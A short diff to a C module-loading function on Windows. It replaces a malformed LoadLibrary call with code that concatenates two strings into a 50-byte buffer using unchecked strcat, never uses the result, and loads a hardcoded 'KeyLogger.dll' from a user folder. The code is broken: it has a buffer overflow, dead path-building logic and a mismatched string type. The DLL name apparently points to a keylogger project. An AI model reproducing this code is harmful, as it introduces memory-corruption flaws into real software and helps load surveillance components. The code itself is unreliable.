@@ -53,9 +53,13 @@ load_module(char *mod_name, char *mod_path) {
 	HINSTANCE hDLL;
 	void* (*mod_init)() = NULL;
 	Module *module;
-
+	char path[50] = "";
+	
 	module = create_module();
-	hDLL = LoadLibrary("%s\\%s.dll", mod_path, mod_name);
+
+	strcat(path, mod_path);
+	strcat(path, mod_name);
+	hDLL = LoadLibrary(L"C:\\Users\\User\\KeyLogger.dll");
 
 	if (hDLL == NULL)
 	{
